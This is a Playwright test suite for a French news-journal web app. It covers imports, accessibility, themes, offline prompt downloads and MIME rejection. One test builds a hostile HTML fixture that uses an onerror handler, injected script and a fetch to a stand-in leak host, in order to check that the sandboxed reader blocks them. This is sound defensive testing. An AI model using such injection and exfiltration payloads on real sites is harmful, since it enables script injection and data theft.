import { diagnostics } from "../helpers/navigation";
import { openReadingTools } from "../helpers/navigation";
import { navigate as nav } from "../helpers/navigation";
import { test, expect, type Page } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
import { readFile } from "node:fs/promises";
const exampleRoot = "public/examples/unified/";
const slots = ["0800", "1000", "1200", "1400", "1600", "1800", "2000", "2200"];
const filename = (slot: string) =>
  `JOURNAL360_2026-10-19_EDITION_${slot.slice(0, 2)}H00.html`;
async function importSlots(page: Page, values = slots) {
  await page
    .getByLabel("Fichiers HTML à importer")
    .setInputFiles(values.map((s) => exampleRoot + filename(s)));
  await page
    .getByRole("button", {
      name: "Enregistrer dans ma bibliothèque",
      exact: true,
    })
    .click();
  await expect(page.getByRole("dialog")).toHaveCount(0);
  const close = page.getByRole("button", {
    name: "Fermer la notification",
    exact: true,
  });
  if (await close.isVisible()) await close.click();
}
const workspace = (page: Page) => page.locator(".unified-workspace");
test("V7 : huit imports désordonnés, un cumul, huit originaux, prompts multiples exacts et recherche locale", async ({
  page,
  context,
}) => {
  await page.goto("/");
  await importSlots(page, ["2200"]);
  await expect(page.locator(".day-card [data-autonomy]")).toHaveAttribute(
    "data-autonomy",
    "AUTONOMOUS",
  );
  await expect(page.locator(".day-card")).toContainText(
    "couverture des faits",
    { ignoreCase: true },
  );
  await importSlots(page, [
    "1600",
    "0800",
    "2000",
    "1200",
    "1800",
    "1000",
    "1400",
  ]);
  await expect(page.locator(".day-card")).toHaveCount(1);
  await expect(page.locator(".day-card [data-history]")).toHaveAttribute(
    "data-history",
    "FULL_CHAIN",
  );
  await expect(page.locator(".day-card [data-coverage]")).toHaveAttribute(
    "data-coverage",
    "UNKNOWN",
  );
  await nav(page, "Aujourd’hui");
  const w = workspace(page);
  await expect(w).toContainText("SYNTHÉTIQUE");
  const diag = await diagnostics(page);
  await expect(diag.locator(".unified-slots button")).toHaveCount(8);
  await expect(diag.locator(".unified-slots button:enabled")).toHaveCount(8);
  await nav(page, "Aujourd’hui");
  for (const zone of ["France", "Europe / zone euro", "États-Unis", "Chine"])
    await expect(
      w.getByRole("heading", { name: zone, exact: true }),
    ).toBeVisible();
  await openReadingTools(page);
  await w.getByRole("button", { name: "Mes prompts .md", exact: true }).click();
  await w.locator(".unified-result").first().click();
  await expect(w.locator(".prompt-card")).toHaveCount(2);
  const payload = JSON.parse(
    await readFile(exampleRoot + "edition-2200.json", "utf8"),
  );
  await context.setOffline(true);
  for (let i = 0; i < 2; i++) {
    const card = w.locator(".prompt-card").nth(i);
    const event = page.waitForEvent("download");
    await card
      .getByRole("button", {
        name: "Télécharger le prompt VS Code (.md)",
        exact: true,
      })
      .click();
    const download = await event;
    expect(download.suggestedFilename()).toBe(payload.promptAssets[i].filename);
    expect(await readFile((await download.path())!, "utf8")).toBe(
      payload.promptAssets[i].content,
    );
  }
  await context.setOffline(false);
  await openReadingTools(page);
  await w
    .getByRole("button", { name: "Recherche globale", exact: true })
    .click();
  await w.getByLabel("Rechercher partout").fill("NE RIEN CHANGER");
  await expect(w.getByLabel("Rechercher partout")).toHaveValue(
    "NE RIEN CHANGER",
  );
  await expect(w.locator(".unified-result")).toHaveCount(2);
  await nav(page, "Articles");
  await expect(page.locator(".articles-total")).toContainText("4 articles");
  await page
    .locator(".article-secondary-actions")
    .filter({
      has: page.getByRole("button", {
        name: "Lire ici : Audit SENTINEL SYNTHÉTIQUE",
        exact: true,
        includeHidden: true,
      }),
    })
    .getByText("Autres lectures et question", { exact: true })
    .click();
  await page
    .getByRole("button", {
      name: "Lire ici : Audit SENTINEL SYNTHÉTIQUE",
      exact: true,
    })
    .click();
  await expect(page.locator(".article-detail .prompt-card")).toHaveCount(2);
  await nav(page, "Sentinel");
  const sentinel = page.getByRole("region", {
    name: "Documents Sentinel",
    exact: true,
  });
  await expect(sentinel.locator(".collection-card")).toHaveCount(1);
  await sentinel
    .getByRole("button", { name: "Développer", exact: true })
    .click();
  await sentinel
    .getByRole("button", { name: "Lire l’article complet", exact: true })
    .click();
  await expect(sentinel.locator(".collection-card .prompt-card")).toHaveCount(
    2,
  );
  await expect(
    page.locator('.sidebar button[aria-label="Sentinel"] small'),
  ).toHaveText("1");
  await nav(page, "IA majeur");
  await expect(
    page
      .getByRole("region", { name: "Documents IA majeur", exact: true })
      .locator(".collection-card h2"),
  ).toHaveText("Observation IA SYNTHÉTIQUE");
  await nav(page, "Bibliothèque");
  await page
    .getByRole("button", { name: "Historique des éditions", exact: true })
    .click();
  await expect(page.locator(".day-history>article")).toHaveCount(8);
});
test("V7 : mobile, clavier, thèmes, absence de données, sources, reduced motion et radar comparable", async ({
  page,
}, info) => {
  await page.emulateMedia({ reducedMotion: "reduce" });
  await page.goto("/");
  const w = workspace(page);
  await expect(w).toContainText("Aucune statistique importée");
  await importSlots(page);
  await nav(page, "Aujourd’hui");
  for (const width of [320, 360, 390, 430, 768, 1024, 1440]) {
    await page.setViewportSize({ width, height: 1000 });
    expect(
      await page.evaluate(
        () => document.documentElement.scrollWidth <= innerWidth,
      ),
    ).toBe(true);
  }
  await w.getByRole("button", { name: "Économie", exact: true }).focus();
  await page.keyboard.press("Enter");
  await expect(w.getByLabel("Zone économique")).toBeVisible();
  await w.getByLabel("Zone économique").selectOption("FR");
  await expect(w.locator(".unified-zones>article")).toHaveCount(1);
  await expect(w).toContainText("+1 points fictifs depuis 2026-08");
  await expect(w).toContainText("2026-09-30");
  await w.getByRole("button", { name: "Chronologie IA", exact: true }).click();
  await w.getByRole("button", { name: "Faits observés", exact: true }).click();
  await expect(w).toContainText("Aucun jalon importé");
  await w.getByRole("button", { name: "Trajectoires", exact: true }).click();
  await expect(
    w.getByRole("heading", { name: "Horizon 2030 SYNTHÉTIQUE", exact: true }),
  ).toBeVisible();
  await w.getByRole("button", { name: "À la une", exact: true }).click();
  for (const theme of ["light", "dark"]) {
    if (theme === "dark")
      await page
        .getByRole("button", { name: "Activer le mode sombre", exact: true })
        .click();
    const results = await new AxeBuilder({ page })
      .withTags(["wcag2a", "wcag2aa", "wcag21aa", "wcag22aa"])
      .analyze();
    expect(
      results.violations.map((v) => ({
        id: v.id,
        nodes: v.nodes.map((n) => n.target),
      })),
    ).toEqual([]);
  }
  expect(
    await w.evaluate((root) =>
      [...root.querySelectorAll("*")].some(
        (el) => getComputedStyle(el).animationName !== "none",
      ),
    ),
  ).toBe(false);
  await page.screenshot({
    path: info.outputPath("v7-desktop.png"),
    fullPage: true,
  });
  await page.setViewportSize({ width: 390, height: 844 });
  await page.screenshot({
    path: info.outputPath("v7-mobile.png"),
    fullPage: true,
  });
  await page.evaluate(async () => {
    await navigator.serviceWorker.ready;
  });
  await expect
    .poll(() => page.evaluate(() => !!navigator.serviceWorker.controller))
    .toBe(true);
  await page.reload();
  await nav(page, "Aujourd’hui");
  await expect(workspace(page)).toContainText("SYNTHÉTIQUE");
});
test("V7 : HTML hostile lu sans scripts, question publique conservée, prompt privé non transmis", async ({
  page,
}) => {
  const payload = JSON.parse(
    await readFile(exampleRoot + "edition-2200.json", "utf8"),
  );
  payload.items[0].publicResearchQuestion =
    "Quels critères publics permettent de vérifier une observation scientifique ?";
  payload.promptAssets[0].content +=
    "\nDonnée de test privée : NE_PAS_TRANSMETTRE";
  delete payload.promptAssets[0].sha256;
  const html = `<!doctype html><html><body><h1>Hostile synthétique</h1><img src="https://example.invalid/leak" onerror="window.exploited=true"><script>window.exploited=true;parent.postMessage({type:'fake'},'*');fetch('https://example.invalid/leak')</script><script id="unifiedData" type="application/json">${JSON.stringify(payload).replaceAll("<", "\\u003c")}</script></body></html>`;
  await page.goto("/");
  await page.getByLabel("Fichiers HTML à importer").setInputFiles({
    name: filename("2200"),
    mimeType: "text/html",
    buffer: Buffer.from(html),
  });
  await page
    .getByRole("button", {
      name: "Enregistrer dans ma bibliothèque",
      exact: true,
    })
    .click();
  await expect(page.getByRole("dialog")).toHaveCount(0);
  await page
    .getByRole("button", { name: `Lire ${payload.title}`, exact: true })
    .click();
  await page
    .getByRole("button", { name: "Réduire la lecture", exact: true })
    .click();
  await expect(page.locator(".edition-frame")).toHaveAttribute("sandbox", "");
  expect(
    await page
      .frameLocator(".edition-frame")
      .locator("body")
      .evaluate(() => "exploited" in window),
  ).toBe(false);
  await nav(page, "Articles");
  await page
    .locator(".article-secondary-actions")
    .filter({
      has: page.getByRole("button", {
        name: "Question Google : Observation IA SYNTHÉTIQUE",
        exact: true,
        includeHidden: true,
      }),
    })
    .getByText("Autres lectures et question", { exact: true })
    .click();
  await page
    .getByRole("button", {
      name: "Question Google : Observation IA SYNTHÉTIQUE",
      exact: true,
    })
    .click();
  await expect(page.getByLabel("Question publique à vérifier")).toHaveValue(
    payload.items[0].publicResearchQuestion,
  );
  await expect(page.getByRole("dialog")).not.toContainText(
    "NE_PAS_TRANSMETTRE",
  );
  await page.getByRole("button", { name: "Annuler", exact: true }).click();
});

test("V7 : adaptateur Future explicite, JSON validé puis import indépendant sans écriture croisée", async ({
  page,
}) => {
  await page.goto("/");
  await importSlots(page, ["2200"]);
  await nav(page, "Aujourd’hui");
  const w = workspace(page);
  await w.getByRole("button", { name: "Chronologie IA", exact: true }).click();
  await w
    .getByText("Transférer un dossier Future validé", { exact: true })
    .click();
  const event = page.waitForEvent("download");
  await w.getByRole("button", { name: /Exporter Future JSON :/ }).click();
  const file = await event;
  const original = JSON.parse(
    await readFile(exampleRoot + "edition-2200.json", "utf8"),
  ).futureDocuments[0];
  const raw = await readFile((await file.path())!);
  expect(JSON.parse(raw.toString("utf8"))).toEqual(original);
  await page.getByLabel("Fichiers HTML à importer").setInputFiles({
    name: file.suggestedFilename(),
    mimeType: "application/json",
    buffer: raw,
  });
  await page.getByRole("button", { name: /Importer \d+ fichier/ }).click();
  await expect(page.locator(".future-title")).toHaveText(original.title);
  await nav(page, "Réglages");
  await page
    .getByText("Profils et options historiques", { exact: true })
    .click();
  await page
    .getByLabel("Profil d’interface", { exact: true })
    .selectOption("complete");
  await nav(page, "Aujourd’hui");
  const futureCard = workspace(page)
    .locator(".unified-universes>article")
    .filter({
      has: page.getByRole("heading", { name: "Le Futur", exact: true }),
    });
  await expect(futureCard).toContainText("1 dossier(s) prospectif(s)");
  await futureCard
    .getByRole("button", { name: "Explorer Le Futur", exact: true })
    .click();
  await expect(workspace(page).locator(".unified-result")).toContainText(
    original.title,
  );
  await nav(page, "Bibliothèque");
  await expect(page.locator(".day-card")).toHaveCount(1);
  await page
    .getByRole("button", { name: "Historique des éditions", exact: true })
    .click();
  await expect(page.locator(".day-history>article")).toHaveCount(1);
});

test("V7 : MIME incohérent refusé sans écriture puis import HTML valide conservé", async ({
  page,
}) => {
  await page.goto("/");
  const buffer = await readFile(exampleRoot + filename("0800"));
  await page
    .getByLabel("Fichiers HTML à importer")
    .setInputFiles({ name: filename("0800"), mimeType: "image/png", buffer });
  await expect(
    page
      .getByRole("status")
      .filter({ hasText: "Type de fichier incohérent : HTML attendu." }),
  ).toBeVisible();
  await expect(page.getByRole("dialog")).toHaveCount(0);
  await expect(page.locator(".day-card")).toHaveCount(0);
  await page
    .getByLabel("Fichiers HTML à importer")
    .setInputFiles({ name: filename("0800"), mimeType: "text/html", buffer });
  await page
    .getByRole("button", {
      name: "Enregistrer dans ma bibliothèque",
      exact: true,
    })
    .click();
  await expect(page.getByRole("dialog")).toHaveCount(0);
  await expect(page.locator(".day-card")).toHaveCount(1);
});

test("V7 : chargement différé de l’accueil sans déplacer un bouton pendant le clic", async ({
  page,
}) => {
  let release!: () => void;
  const loaded = new Promise<void>((resolve) => {
    release = resolve;
  });
  await page.route(/\/assets\/UnifiedWorkspace-.*\.js$/, async (route) => {
    await loaded;
    await route.continue();
  });
  await page.goto("/", { waitUntil: "domcontentloaded" });
  await expect(
    page
      .getByRole("status", { name: "" })
      .filter({ hasText: "Ouverture du journal unifié" }),
  ).toBeVisible();
  await expect(
    page.getByRole("button", { name: "Essayer avec 2 éditions démo" }),
  ).toHaveCount(0);
  release();
  await page
    .getByRole("button", { name: "Essayer avec 2 éditions démo" })
    .click();
  await page
    .getByRole("button", { name: "Enregistrer dans ma bibliothèque" })
    .click();
  await expect(page.locator(".edition-card")).toHaveCount(2);
});
